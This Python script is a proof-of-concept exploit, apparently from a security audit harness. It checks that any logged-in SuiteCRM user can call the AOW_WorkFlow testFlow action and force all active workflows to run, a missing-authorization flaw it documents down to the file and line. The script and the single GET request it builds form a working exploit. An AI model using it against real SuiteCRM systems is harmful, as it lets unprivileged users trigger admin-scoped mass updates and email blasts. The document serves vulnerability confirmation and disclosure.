#!/usr/bin/env python3
"""
VULN-026 — `AOW_WorkFlow testFlow` lets any authenticated user run ALL active workflows
=======================================================================================

Sink  : targets/SuiteCRM/modules/AOW_WorkFlow/controller.php:633-642  action_testFlow()
        -> $workflow->run_flows()   (no is_admin / ACLAccess; AOW_WorkFlow absent from $adminOnlyList)
Class : CWE-862 Missing Authorization / BFLA (Broken Function-Level Authorization)

Plain-English flaw
------------------
`action_testFlow` instantiates AOW_WorkFlow and calls `run_flows()` — the routine
the scheduler uses to fire every *active* workflow — with no is_admin check, no
ACL check, and the module is not in `$adminOnlyList`. Any authenticated user can
therefore force an out-of-schedule execution of all active workflows (mass
updates, reassignments, email blasts), i.e. trigger a privileged, admin-authored
automation on demand.

Exploitation idea
-----------------
A single GET `index.php?module=AOW_WorkFlow&action=testFlow` as an ordinary user
runs `run_flows()`; the handler echoes `Started` and then `PASSED` when the run
completes.

What a successful run proves
----------------------------
A low-privilege user invokes the scheduler's workflow-execution routine and it
runs to completion (`Started ... PASSED`), demonstrating unauthorized execution
of a privileged, admin-scoped function.
"""
import os
import sys

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
from _common import BASE_URL, log, banner, verdict, admin_session, create_user, web_login

LOWPRIV_PASS = os.environ.get("LOWPRIV_PASS", "LowPriv@2026x!")


def main():
    banner("VULN-026", "AOW_WorkFlow testFlow -> run_flows() runnable by any user (BFLA)")
    log("INFO", "sink: modules/AOW_WorkFlow/controller.php:639 run_flows() with no is_admin/ACL gate")

    log("SETUP", "admin creates a disposable low-privilege user (is_admin=0)")
    adm = admin_session()
    u = create_user(adm, LOWPRIV_PASS)
    s = web_login(u["user_name"], u["password"])
    log("SETUP", f"authenticated as low-priv user {u['user_name']}")

    # The bug: testFlow calls run_flows() (the scheduler routine) with no admin gate.
    log("STEP", "GET module=AOW_WorkFlow&action=testFlow as the low-priv user -> should run ALL active workflows")
    r = s.get(f"{BASE_URL}/index.php",
              params={"module": "AOW_WorkFlow", "action": "testFlow"}, timeout=180)

    d = os.path.dirname(os.path.abspath(__file__))
    with open(os.path.join(d, "request.http"), "w") as f:
        f.write("GET /index.php?module=AOW_WorkFlow&action=testFlow HTTP/1.1\r\n"
                "Host: localhost:33116\r\nCookie: PHPSESSID=<low-priv session>\r\n")
    with open(os.path.join(d, "response.txt"), "w") as f:
        f.write(f"HTTP {r.status_code}\n\n{r.text[:600]}")

    started = "Started" in r.text
    passed = "PASSED" in r.text
    denied = "not have access" in r.text.lower() or "not authorized" in r.text.lower()
    log("PROOF", f"response begins: {r.text[:40]!r}  (Started={started}, PASSED={passed}, access-denied={denied})")

    if started and not denied:
        log("OK", "exploit confirmed — a non-admin invoked run_flows(); the scheduler workflow-execution "
                  f"routine ran ({'to completion (PASSED)' if passed else 'started'}) with no authorization")
        verdict("VULN-026", "CONFIRMED",
                "any authenticated user runs all active workflows via testFlow -> run_flows() (BFLA)")
        sys.exit(0)
    log("FAIL", f"testFlow did not run for the non-admin (started={started}, denied={denied})")
    verdict("VULN-026", "FAILED", "run_flows was not reachable by the non-admin")
    sys.exit(1)


if __name__ == "__main__":
    main()
